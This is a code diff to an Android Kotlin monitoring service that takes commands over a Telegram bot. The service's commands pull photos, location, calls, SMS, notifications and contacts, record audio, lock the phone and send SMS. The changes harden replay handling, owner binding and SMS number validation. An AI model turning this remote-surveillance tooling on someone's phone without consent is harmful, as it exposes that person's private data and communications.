@@ -114,6 +114,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
+        private val NO_REPLAY_COMMANDS = setOf("/smsconfirm", "/ring", "/record", "/lock")
         private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
@@ -664,7 +665,7 @@ class MonitoringService : Service() {
         if (botToken.isEmpty() || chatId.isEmpty()) return false
 
         val offset = preferencesManager.lastUpdateId + 1
-        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22callback_query%22%5D"
+        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22channel_post%22,%22edited_channel_post%22,%22callback_query%22%5D"
 
         var response = try {
             TelegramClient.api.getUpdates(url)
@@ -680,7 +681,7 @@ class MonitoringService : Service() {
             }
             val (freshToken, freshChat) = sendCreds()
             if (freshToken.isNotEmpty() && freshToken != botToken) {
-                val retryUrl = "https://api.telegram.org/bot$freshToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22callback_query%22%5D"
+                val retryUrl = "https://api.telegram.org/bot$freshToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22channel_post%22,%22edited_channel_post%22,%22callback_query%22%5D"
                 response = try {
                     TelegramClient.api.getUpdates(retryUrl)
                 } catch (e: kotlinx.coroutines.CancellationException) {
@@ -772,7 +773,7 @@ class MonitoringService : Service() {
                         "pause60" -> "/pause"
                         else -> null
                     }
-                    if (cbCommand != null && cbCommand in MUTATING_COMMANDS) {
+                    if (cbCommand != null && cbCommand in NO_REPLAY_COMMANDS) {
                         try {
                             if (update.updateId > preferencesManager.lastUpdateId) {
                                 preferencesManager.setLastUpdateIdSync(update.updateId)
@@ -787,7 +788,9 @@ class MonitoringService : Service() {
                     val senderId = message?.from?.id?.toString().orEmpty()
                     val chatOk = msgChatId.isNotEmpty() && msgChatId == chatId
                     val rawText = (message?.text ?: message?.caption)?.trim().orEmpty()
-                    if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && rawText.substringBefore(" ").trim().lowercase(java.util.Locale.ROOT) == "/start") {
+                    val startHead = rawText.substringBefore(" ").trim().substringBefore("@").lowercase(java.util.Locale.ROOT)
+                    val startArg = if (rawText.contains(" ")) rawText.substringAfter(" ").trim() else ""
+                    if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && startHead == "/start" && startArg == chatId) {
                         val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
                         if (learned) {
                             registerBotCommands()
@@ -802,7 +805,7 @@ class MonitoringService : Service() {
                         if (command.startsWith("/")) {
                             val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
                             val input = if (arg.isEmpty()) command else "$command $arg"
-                            if (command in MUTATING_COMMANDS) {
+                            if (command in NO_REPLAY_COMMANDS) {
                                 try {
                                     if (update.updateId > preferencesManager.lastUpdateId) {
                                         preferencesManager.setLastUpdateIdSync(update.updateId)
@@ -1387,7 +1390,7 @@ class MonitoringService : Service() {
                 val normalized = if (number.startsWith("+")) "+" + number.drop(1).filter { it.isDigit() } else number.filter { it.isDigit() }
                 if (number.isEmpty() || smsText.isEmpty()) {
                     sendToTelegram("Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
-                } else if (number.contains('*') || number.contains('#')) {
+                } else if (number.contains('*') || number.contains('#') || number.contains(',') || number.contains(';') || number.any { it.isLetter() } || number.count { it == '+' } > 1 || (number.contains('+') && !number.startsWith("+"))) {
                     sendToTelegram("\u26A0\uFE0F Invalid number. Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
                 } else if (!normalized.matches(SMS_NUMBER_REGEX)) {
                     sendToTelegram("\u26A0\uFE0F Invalid number. Usage: /sms \u003cnumber\u003e \u003cmessage\u003e")
